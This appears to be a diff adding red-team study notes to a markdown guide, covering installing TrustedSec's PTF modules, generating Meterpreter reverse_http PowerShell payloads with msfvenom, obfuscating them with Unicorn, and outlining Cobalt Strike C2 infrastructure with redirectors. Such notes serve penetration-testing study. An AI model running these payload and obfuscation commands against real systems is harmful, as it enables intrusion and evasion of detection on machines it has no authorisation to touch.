@@ -79,3 +79,101 @@
    ```bash
    git clone https://github.com/trustedsec/ptf /opt/ptf
    cd /opt/ptf && ./ptf
+
+	3.	Install Modules:
+	•	Exploitation:
+
+use modules/exploitation/install_update_all
+
+	3.	
+	•	Intelligence Gathering:
+
+use modules/intelligence-gathering/install_update_all
+
+	3.	
+	•	Post Exploitation:
+
+use modules/post-exploitation/install_update_all
+
+	3.	
+	•	PowerShell:
+
+use modules/powershell/install_update_all
+
+	3.	
+	•	Vulnerability Analysis:
+
+use modules/vulnerability-analysis/install_update_all
+
+
+	4.	Navigate to Pentest Directory:
+
+cd /pentest
+
+
+
+Payload Delivery and Obfuscation
+
+	•	Obfuscating Meterpreter Payloads:
+	•	Use msfvenom (Metasploit Framework tool for generating payloads):
+
+msfvenom --payload windows/x64/meterpreter_reverse_http --format psh --out meterpreter-64.ps1 LHOST=127.0.0.1
+
+	•	
+	•	Use tools like Unicorn for obfuscation:
+	•	Clone Unicorn repository:
+
+git clone https://github.com/trustedsec/unicorn
+
+	•		•	
+	•	Generate obfuscated payload:
+
+python unicorn.py windows/meterpreter/reverse_http [IP] 8080
+
+
+
+Diagrams
+
+Cobalt Strike Infrastructure
+
+Explanation:
+
+	•	Master C2 Server: The main command and control server.
+	•	Domain Redirectors: Intermediate servers that forward traffic to the Master C2 Server.
+	•	Victim: The compromised machine that communicates with the C2 infrastructure.
+
+Setting Up External Servers
+
+Steps:
+
+	1.	Choose VPS provider (Digital Ocean, AWS Lightsail).
+	2.	Create and configure instance (minimum 1GB RAM).
+	3.	Install necessary packages and tools.
+	4.	Secure connection using SSH.
+
+References
+
+	•	TrustedSec’s Pentester Framework: PTF
+	•	Unicorn for Payload Obfuscation: Unicorn
+	•	Red Canary Techniques: Red Canary
+	•	APT Groups and Operations: APT Groups
+	•	Metasploit Framework: Metasploit Wiki
+
+Example Scripts
+
+	•	Creating a Meterpreter Payload:
+
+msfvenom --payload windows/x64/meterpreter_reverse_http --format psh --out meterpreter-64.ps1 LHOST=127.0.0.1
+
+
+	•	Using Unicorn for Payload Obfuscation:
+
+git clone https://github.com/trustedsec/unicorn
+python unicorn.py windows/meterpreter/reverse_http [IP] 8080
+
+
+
+Enhanced Notes
+
+	•	Understanding APT: Advanced Persistent Threat (APT) refers to prolonged and targeted cyberattacks in which an intruder gains access to a network and remains undetected for an extended period.
+	•	TTD (Time to Detect): A metric used to measure the time taken to detect a cyberattack.
